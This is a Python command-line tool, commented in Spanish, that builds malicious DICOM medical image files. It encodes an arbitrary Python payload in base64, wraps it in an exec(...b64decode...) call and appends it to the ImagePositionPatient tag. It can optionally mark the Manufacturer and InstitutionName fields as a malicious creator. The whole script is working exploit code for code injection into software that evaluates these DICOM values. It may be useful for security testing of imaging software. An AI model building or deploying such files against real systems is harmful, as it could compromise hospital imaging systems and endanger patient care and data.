import pydicom
import base64
import argparse
import os

pydicom.config.settings.reading_validation_mode = pydicom.config.IGNORE

def encode_payload(plain_payload):
    """Codifica el payload en base64"""
    try:
        if isinstance(plain_payload, str) and os.path.exists(plain_payload):
            with open(plain_payload, 'rb') as f:
                data = f.read()
        else:
            #  texto directo a bytes
            data = str(plain_payload).encode('utf-8')
        
        encoded = base64.b64encode(data)
        return f"exec(__import__('base64').b64decode({encoded}))"
    except Exception as e:
        print(f"Error codificando payload: {e}")
        return None

def prepare_dicom_payload(dicom_file_path, payload):
    """Prepara el payload para insertar en DICOM"""
    mal = []  # init
    
    try:
        # Verificar que el archivo existe
        if not os.path.exists(dicom_file_path):
            print(f"Error: El archivo {dicom_file_path} no existe")
            return None
            
        dicom_data = pydicom.dcmread(dicom_file_path)
        
        # Obtener valores existentes del campo ImagePositionPatient (0020,0032)
        if (0x0020, 0x0032) in dicom_data:
            values = dicom_data[0x0020, 0x0032].value
            if hasattr(values, '__iter__'):
                mal = [str(i) for i in values]
            else:
                mal = [str(values)]
        else:
            # Si el campo no existe, crear lista vacía
            mal = []
        
        # Codificar y agregar payload
        encoded_payload = encode_payload(payload)
        if encoded_payload:
            mal.append(encoded_payload)
            print(f"Payload codificado: {encoded_payload[:50]}...")
            return mal
        else:
            return None
            
    except pydicom.errors.InvalidDicomError:
        print("Error: El archivo no es un DICOM.")
        return None
    except Exception as e:
        print(f"Error procesando DICOM: {e}")
        return None

def modify_dicom_field(dicom_file_path, malicious_tag, outfile, sign):
    """Modifica el campo DICOM con el payload"""
    try:
        dicom_dataset = pydicom.dcmread(dicom_file_path)
        
        if sign:
            dicom_dataset.Manufacturer = "Malicious DICOM file creator"
            dicom_dataset.InstitutionName = "Malicious DICOM file institution"
        
        # Crear y asignar el elemento de datos
        elem = pydicom.dataelem.DataElement(0x00200032, 'CS', malicious_tag)
        dicom_dataset[0x00200032] = elem
        
        # Guardar el archivo modificado
        dicom_dataset.save_as(outfile)
        print(f"Archivo guardado exitosamente como: {outfile}")
        print(f"Payload insertado en campo ImagePositionPatient")
        
    except Exception as e:
        print(f"Error modificando DICOM: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Modificar archivo DICOM con payload')
    parser.add_argument('--dicom', required=True, help='Ruta al archivo DICOM de entrada')
    parser.add_argument('--outfile', required=True, help='Ruta al archivo DICOM de salida')
    parser.add_argument('--payload', required=False, default="print('Test')", 
                       help='Archivo con código Python o texto del payload')
    parser.add_argument('--signature', required=False, default=True, 
                       type=lambda x: x.lower() == 'true',
                       help='Modificar campos de firma (True/False)')
    
    args = parser.parse_args()
    
    print(f"Procesando: {args.dicom}")
    print(f"Signature: {args.signature}")
    
    # Preparar el payload
    tmp_tag = prepare_dicom_payload(args.dicom, payload=args.payload)
    
    if tmp_tag:
        malicious_tag = '\\'.join(tmp_tag)
        print("Payload preparado exitosamente")
        
        # Modificar el archivo DICOM
        modify_dicom_field(args.dicom, malicious_tag, args.outfile, sign=args.signature)
        exit(0)
    else:
        print("Error: No se pudo preparar el payload")
        exit(1)
